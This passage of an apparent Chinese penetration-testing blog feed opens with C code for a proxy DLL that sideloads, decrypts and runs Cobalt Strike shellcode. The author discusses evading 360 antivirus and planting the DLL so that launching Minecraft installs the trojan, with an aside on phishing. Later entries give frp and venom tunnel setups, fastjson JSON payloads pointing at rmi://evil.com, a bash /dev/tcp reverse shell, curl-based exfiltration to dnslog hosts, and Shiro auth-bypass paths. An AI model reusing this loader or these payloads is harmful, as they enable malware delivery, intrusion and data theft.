class="hljs-string">&quot;JLI_List_new&quot;</span>);<br>    pJLI_ManifestIterate = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ManifestIterate&quot;</span>);<br>    pJLI_MemAlloc = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_MemAlloc&quot;</span>);<br>    pJLI_MemFree = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_MemFree&quot;</span>);<br>    pJLI_PreprocessArg = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_PreprocessArg&quot;</span>);<br>    pJLI_ReportErrorMessage = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportErrorMessage&quot;</span>);<br>    pJLI_ReportErrorMessageSys = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportErrorMessageSys&quot;</span>);<br>    pJLI_ReportExceptionDescription = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportExceptionDescription&quot;</span>);<br>    pJLI_ReportMessage = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_ReportMessage&quot;</span>);<br>    pJLI_SetTraceLauncher = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_SetTraceLauncher&quot;</span>);<br>    pJLI_StringDup = (UINT_PTR)GetProcAddress(hOrg, <span class="hljs-string">&quot;JLI_StringDup&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 3. Shellcode 区域</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = &#123; <br>    <span class="hljs-comment">// ... 你的 CS Payload ... </span><br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span> <span class="hljs-comment">// 示例</span><br>&#125;; <br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[] = &#123; <span class="hljs-number">0x77</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x64</span> &#125;;<br><br><span class="hljs-comment">// 4. 恶意线程：在后台跑，不阻塞主程序</span><br>DWORD WINAPI <span class="hljs-title function_">PayloadThread</span><span class="hljs-params">(LPVOID lpParam)</span> &#123;<br>    SIZE_T size = <span class="hljs-keyword">sizeof</span>(shellcode);<br>    <br>    <span class="hljs-comment">// 申请内存 (RWX) - 生产环境建议先 RW 再改成 RX</span><br>    LPVOID pMem = VirtualAlloc(<span class="hljs-literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (!pMem) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(pMem, shellcode, size);<br>    decrypt_mem(pMem, size, key, <span class="hljs-keyword">sizeof</span>(key)); <span class="hljs-comment">// 你的解密函数</span><br><br>    <span class="hljs-comment">// 执行</span><br>    ((<span class="hljs-type">void</span>(*)())pMem)();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 5. DLL 入口</span><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)</span> &#123;<br>    <span class="hljs-keyword">switch</span> (dwReason) &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-comment">// 第一步：必须先初始化代理，否则白程序调用函数时会跳到空地址导致崩溃</span><br>        SetupProxies(); <br>        <br>        <span class="hljs-comment">// 第二步：启动后台线程跑马，解决阻塞问题</span><br>        CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, PayloadThread, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">if</span> (hOrg) FreeLibrary(hOrg);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是我试过了，这是非分离式的代码，会被杀的，所以需要分离式的，然后再加上一些免杀手法，是可以过的，具体代码我就不放了，反正效果是可以无感过360的，白程序也可以正常运行。但是有一个问题，白程序正常运行了之后，是会退出的，比如我java –version，正常输出版本信息之后就退出了，这时我的shellcode线程也会退出，需要找个方法解决，老办法，还是靠gemini3。gemini3给的方法是使用APC程注入，或者设置cs的profile为一上线就进行进程注入。但是我想了一个鬼点子。<br>我们都知道mc现在是非常的流行，很多人都会定期打开mc来玩几把，而mc又需要使用java，那我们可不可以通过启动mc来上线木马？</p><h1 id="MC上线木马"><a href="#MC上线木马" class="headerlink" title="MC上线木马"></a>MC上线木马</h1><p>我一开始尝试的时候是mc正常启动，但是木马未上线，我百思不得其解，然后就把启动脚本导出，发现是工作目录的问题</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">chcp</span> <span class="hljs-number">65001</span>&gt;<span class="hljs-built_in">nul</span><br>@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">title</span> 启动 - <span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span><br><span class="hljs-built_in">echo</span> 游戏正在启动，请稍候。<br><span class="hljs-built_in">cd</span> /D &quot;C:\Users\Lucifer\Desktop\w\.minecraft\versions\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>\&quot;<br><br><br>&quot;C:\Users\Lucifer\Desktop\w\jdk-<span class="hljs-number">17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">101</span>-hotspot\bin\java.exe&quot; -Dstderr.encoding=UTF-<span class="hljs-number">8</span> -Dstdout.encoding=UTF-<span class="hljs-number">8</span> -XX:+UseG1GC -XX:-UseAdaptiveSizePolicy -XX:-OmitStackTraceInFastThrow -Djdk.lang.Process.allowAmbiguousCommands=true -Dfml.ignoreInvalidMinecraftCertificates=True -Dfml.ignorePatchDiscrepancies=True -Dlog4j2.formatMsgNoLookups=true -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe.heapdump &quot;-Djava.library.<span class="hljs-built_in">path</span>=C:\Users\Lucifer\Desktop\w\.minecraft\versions\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>-natives&quot; &quot;-Djna.tmpdir=C:\Users\Lucifer\Desktop\w\.<br>......<br>tmpdir=&quot;C:\Users\Lucifer\Desktop\w\PCL&quot; -jar &quot;C:\Users\Lucifer\Desktop\w\PCL\JavaWrapper.jar&quot; <span class="hljs-built_in">net</span>.minecraft.client.main.Main --username <span class="hljs-number">5621</span> --version <span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span> --gameDir &quot;C:\Users\Lucifer\Desktop\w\.minecraft\versions\<span class="hljs-number">1</span>.<span class="hljs-number">20</span>.<span class="hljs-number">2</span>&quot; --assetsDir &quot;C:\Users\Lucifer\Desktop\w\.minecraft\assets&quot; --assetIndex <span class="hljs-number">8</span> --uuid <span class="hljs-number">00000</span>FFFFFFFFFFFFFFFFFFFFFFE9ACA --accessToken <span class="hljs-number">00000</span>FFFFFFFFFFFFFFFFFFFFFFE9ACA --clientId $&#123;clientid&#125; --xuid $&#123;auth_xuid&#125; --userType msa --versionType PCL --width <span class="hljs-number">854</span> --height <span class="hljs-number">480</span><br><span class="hljs-built_in">echo</span> 游戏已退出。<br><span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure><p>中间我删掉了很多，因为对我们来说无用。我拿着问了一下gemini3，说是工作目录的问题，在启动脚本中有一个<code>cd /D &quot;C:\Users\Lucifer\Desktop\w\.minecraft\versions\1.20.2\&quot;</code>运行了这行之后，我们的工作目录就到了mc的版本目录中去了，然后我代码中读取shellcode时使用的是相对目录，那他就会在这个mc的版本目录中去读取我加密的shellcode，要解决也很简单，一个是将加密shellcode放到这个mc的版本目录中，另外一个办法就是在代码中获取当前dll目录，然后再拼接<br><img src="https://i.ibb.co/4ZG9bF4G/image.png"><br>我嫌麻烦就没去弄了，直接将加密的shellcode放在mc的版本目录下。当然如果要拿着去钓鱼的话，还是要动态配置目录，不然mc版本目录下有一个dll文件非常可疑，话不多说，我们来看看效果。<br><img src="https://i.ibb.co/xtPKTVsg/image.png"><br>至于国外的edr什么的我没去试，因为我没有安装包</p><p>要找白程序和黑dll可以去这个网站找<code>https://hijacklibs.net/</code></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隧道工具的使用</title>
    <link href="/%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>环境的话随便自己搭建一个内网环境，或者用网上的域环境或者内网靶场也好<br>我的网络情况是这样的</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">host&lt;--&gt;wi<span class="hljs-symbol">n10</span>&lt;--&gt;wi<span class="hljs-symbol">n7</span><br>即本机可以访问wi<span class="hljs-symbol">n10</span>，wi<span class="hljs-symbol">n10</span>可以出网，wi<span class="hljs-symbol">n10</span>有<span class="hljs-number">2</span>张网卡，可以访问wi<span class="hljs-symbol">n7</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/dsvntH3q/image.png"><br>物理机无法访问这个内网页面，虚拟机win10可以访问<br><img src="https://i.ibb.co/RGWxtrb1/image.png"></p><h1 id="frp-proxifier"><a href="#frp-proxifier" class="headerlink" title="frp + proxifier"></a>frp + proxifier</h1><p>服务端配置文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = test@<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>然后服务端指定配置文件运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frps -c frps.ini<br></code></pre></td></tr></table></figure><p>将frpc.exe传到win10，配置文件这样写</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = x.x.x.x <span class="hljs-comment">#这里填你服务器的ip</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">token</span> = test@<span class="hljs-number">123</span><br><span class="hljs-section">[socks5]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1081</span><br><span class="hljs-attr">plugin</span> = socks5<br><span class="hljs-attr">plugin_user</span> = test<br><span class="hljs-attr">plugin_passwd</span> = <span class="hljs-number">123</span><br><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>然后同样指定配置文件运行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">frpc.exe -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/CshLNnx3/image.png"><br>这个时候已经连接成功，然后使用proxifier代理流量<br><img src="https://i.ibb.co/cScYRbvf/image.png"><br>选择socks5协议，规则默认即可<br><img src="https://i.ibb.co/whL2nRYR/image.png"><br>然后物理机就可以访问win7的服务了<br><img src="https://i.ibb.co/bjnP1Ys9/image.png"><br>如果有多级的主机那就要多级的代理<br>vps&lt;–&gt;win10(边界主机，可以访问内网和外网)&lt;–&gt;win10 a(内网)&lt;–&gt;win10 b<br>如果想代理到win10 b的话那就要vps运行服务端，win10运行服务端和客户端，win10 a运行服务端和客户端，然后win10 运行客户端，这样层层代理下来，当然是每一次的网段不一样菜肴这样，如果网段一样在win10就可以访问win10 b的话就没必要这样了</p><h1 id="venom-proxifier"><a href="#venom-proxifier" class="headerlink" title="venom + proxifier"></a>venom + proxifier</h1><p>服务端运行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin_linux_x86</span> -lport <span class="hljs-number">7000</span> -passwd test@<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>win10运行agent</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">.\agent.exe -rhost <span class="hljs-number">192.210</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> -rport <span class="hljs-number">7000</span> -passwd test<span class="hljs-title">@123</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/q3ywKvTT/image.png"><br>然后进入node 1开启socks，然后同样的在proxifier连接好，物理机又可以访问win7的网络了<br><img src="https://i.ibb.co/4ZQybs2q/image.png"><br>venom在多级级联的时候会比较方便，比如vps–A–B代理，A可以出网，B不可以出网，这个时候只要A运行agent指定服务端为vps，假设此处A在vps为节点1，B为节点2，然后在vps的venom终端<code>goto 1</code>进入节点1，然后<code>listen port</code>，B运行agent指定A为服务端，然后在venom处<code>goto 2</code>开启socks<code>socks port</code>即可实现多级代理，这样比frp好一些，不用写很多配置文件</p><h1 id="ligolo-ng"><a href="#ligolo-ng" class="headerlink" title="ligolo-ng"></a>ligolo-ng</h1><p>ligolo-ng我目前使用是发现只能本机使用，如果想要web访问页面的话，vps得有图形化界面，否则只能命令行访问<br>linux下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> ip </span>tuntap <span class="hljs-built_in">add</span><span class="hljs-built_in"> user </span>kali mode tun ligolo<br></code></pre></td></tr></table></figure><p>添加虚拟网卡，然后受害者主机启动agent<br><img src="https://i.ibb.co/C3zkVvRK/image.png"><br>然后在服务端上给网卡添加网段并在session中start启动<br><img src="https://i.ibb.co/tpG6F958/image.png"><br>然后就可以访问内网了<br><img src="https://i.ibb.co/4wYr3czc/image.png"><br>windows的话有点麻烦<br><img src="https://i.ibb.co/G4V7bJP3/image.png"><br>或许是可以找一个方法让我们的主机在访问时进过vps的代理，这样子的话就可以不用一个有图形化界面的vps了，这个还在研究中</p><h1 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h1><p>目前还在摸索中</p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
      <tag>tunnel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson漏洞复现</title>
    <link href="/fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以下漏洞都可以从vulhub下载<br><a href="https://github.com/vulhub/vulhub/tree/master/fastjson">https://github.com/vulhub/vulhub/tree/master/fastjson</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。<br>由于要获取json数据详细类型，每次都需要读取@type，而@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。<br>那么供给制只要准备rmi服务器和web服务器，将rmi绝对路径注入到lookup方法中，受害者jndi接口会指向攻击者控制rmi服务器，jndi接口从攻击者控制的web服务器远程加载恶意代码并执行，形成RCE</p><h1 id="漏洞利用详解"><a href="#漏洞利用详解" class="headerlink" title="漏洞利用详解"></a>漏洞利用详解</h1><ul><li>攻击者访问目标网站，抓包修改请求体，将构造的恶意类信息发送给目标机</li><li>目标对json反序列化时会加载执行我们的恶意信息，向rmi服务器请求待执行的命令</li><li>rmi服务器请求远程机器的class，得到我们要执行的命令</li><li>rmi将远程加载的class作为响应返回给靶机服务器</li><li>靶机执行恶意代码</li></ul><p>附上大佬图解<br><img src="https://i.ibb.co/PGVK2pfv/image.png"></p><h1 id="1-2-24-RCE"><a href="#1-2-24-RCE" class="headerlink" title="1.2.24-RCE"></a>1.2.24-RCE</h1><p>docker启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/fastjson/1.2.24-rce;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>访问ip:8090<br><img src="https://i.ibb.co/p6rHYMH2/image.png"></p><h2 id="yakit梭哈"><a href="#yakit梭哈" class="headerlink" title="yakit梭哈"></a>yakit梭哈</h2><p>在yakit开启反连服务器并配置payload<br><img src="https://i.ibb.co/nMYC7DBf/image.png"><br>(将java版本修改为8)<br>yakit抓包，根据给的poc修改json数据<br><img src="https://i.ibb.co/fzj1YLvj/image.png"><br>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://evil.com:9999/TouchFile&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>将rmi地址改为我们的地址<br><img src="https://i.ibb.co/dJHbDqyB/image.png"><br>可以看到反连服务器已经有了连接<br><img src="https://i.ibb.co/5mqp92K/image.png"><br>在docker容器中也可以看到命令已经执行<br><img src="https://i.ibb.co/tphPHXKL/image.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>将命令修改为反弹shell,并在yakit监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.184.196/8088 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/j9Sc4V77/image.png"><br>反弹shell成功<br><img src="https://i.ibb.co/mrJmbM5J/image.png"></p><p>使用dnslog外带命令回显<br>首先在yakit申请一个dnslog域名<br><img src="https://i.ibb.co/C505ddkX/image.png"><br>然后在反连服务器中将命令修改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://lyhggxfmux.iyhc.eu.org/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><p>在Shell中，反引号用于命令替换，即先执行内部的命令，然后将结果嵌入到外部命令中。<br>随后重新发包，在dnslog处看到命令执行结果<br><img src="https://i.ibb.co/xt4Fsx15/image.png"></p><h1 id="1-2-47-RCE"><a href="#1-2-47-RCE" class="headerlink" title="1.2.47-RCE"></a>1.2.47-RCE</h1><p>Fastjson 是阿里巴巴公司开源的一款 JSON 解析器，其性能优越，被广泛应用于各大厂商的 Java 项目中。Fastjson 于 1.2.24 版本后增加了反序列化白名单，而在 1.2.48 以前的版本中，攻击者可以利用特殊构造的 JSON 字符串绕过白名单检测，成功执行任意命令。<br>可以根据漏洞页面手工搭建环境利用，注意java的版本就行。我这里使用yakit一把梭哈</p><p>docker启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/fastjson/1.2.47-rce;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>访问ip:8090<br><img src="https://i.ibb.co/MDDLYktC/image.png"></p><h2 id="yakit梭哈-1"><a href="#yakit梭哈-1" class="headerlink" title="yakit梭哈"></a>yakit梭哈</h2><p>在yakit开启反连服务器并配置payload,同时开启dnslog并随机注册域名<br>恶意类选runtimeexec，java版本设置为8<br><img src="https://i.ibb.co/XfPn7RRx/image.png"><br>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://shcjkonvet.iyhc.eu.org/`<span class="hljs-built_in">whoami</span>`<br></code></pre></td></tr></table></figure><p>yakit抓包发送到web fuzz，根据payload修改rmi地址</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://evil.com:9999/Exploit&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.ibb.co/8gMg1fXW/image.png"><br>返回400没关系，查看反连服务器发现有了请求，再看dnslog，等待一段时间之后有了回显（yakit的dnslog有些是国外的，需要等一段时间,可以多发几次包）<br><img src="https://i.ibb.co/5Xx33RMs/image.png"></p><h2 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>在端口监听出监听一个端口，同时生成一个反弹shell的命令，在反连服务器处重新生成恶意类<br><img src="https://i.ibb.co/sv1dymfC/image.png"><br>webfuzz发包后收到shell<br><img src="https://i.ibb.co/7tRW2cGC/image.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro复现</title>
    <link href="/shiro%E5%A4%8D%E7%8E%B0/"/>
    <url>/shiro%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>以下漏洞都可以从vulhub下载<br>@<a href="https://github.com/vulhub/vulhub/tree/master/shiro">https://github.com/vulhub/vulhub/tree/master/shiro</a></p><h1 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h1><p>影响版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache Shiro &lt; 1.1.0<br>JSecurity 0.9.x<br></code></pre></td></tr></table></figure><p>漏洞原理<br>shiro进行权限验证前未对url做标准化处理，可以通过构造/、//、/./、/../等绕过权限验证<br>docker启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/shiro/CVE-2010-3863;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>访问ip:8080<br>正常请求/admin会跳转回登录页面<br><img src="https://i.ibb.co/6RTqfxvV/image.png"><br>构造/./admin绕过验证<br><img src="https://i.ibb.co/BV1LRKzJ/image.png"></p><h1 id="CVE-2016-4437-Shiro-550"><a href="#CVE-2016-4437-Shiro-550" class="headerlink" title="CVE-2016-4437(Shiro-550)"></a>CVE-2016-4437(Shiro-550)</h1><p>影响版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache Shiro &lt;= 1.2.4<br></code></pre></td></tr></table></figure><p>漏洞原理<br>在apache shiro 1.2.4以前的版本中，加密的用户信息序列化后存储在名为remember-me的cookie中。<br>攻击者可以使用shiro的默认密钥伪造用户cookie触发java反序列化漏洞，进而在机器中RCE<br>使用docker搭建环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/shiro/CVE-2016-4437;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>手动利用可以参考<a href="https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2016-4437/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/shiro/CVE-2016-4437/README.zh-cn.md</a><br>通过手动构造恶意利用类<br>这里我使用shiro综合利用工具(<a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a>)<br>先爆破密钥，再检测利用链<br><img src="https://i.ibb.co/vxJ5G6jV/image.png"><br>随后即可执行命令或者注入内存马</p><h1 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h1><p>影响版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apache Shiro &lt; 1.5.3<br></code></pre></td></tr></table></figure><p>漏洞原理<br>在apache shiro 1.5.2以前的版本中，在使用spring动态控制器时，攻击者通过构造<code>..;</code>这样的跳转,可以绕过shiro中对目录的权限限制。<br>使用docker搭建环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> vulhub/shiro/CVE-2020-1957;<br>docker-compose up -d;<br></code></pre></td></tr></table></figure><p>访问ip:8080<br>直接访问admin会被重定向<br><img src="https://i.ibb.co/wF572Tf8/image.png"><br>构造<code>/xxx/..;/admin/</code>绕过权限限制,也可以使用fuzz对其进行测试<br><img src="https://i.ibb.co/V0MjFpzw/image.png"></p><h1 id="CVE-2019-12422-Shiro-721"><a href="#CVE-2019-12422-Shiro-721" class="headerlink" title="CVE-2019-12422(Shiro-721)"></a>CVE-2019-12422(Shiro-721)</h1><p>影响版本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">6</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>,  <br><span class="hljs-attribute">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span>,  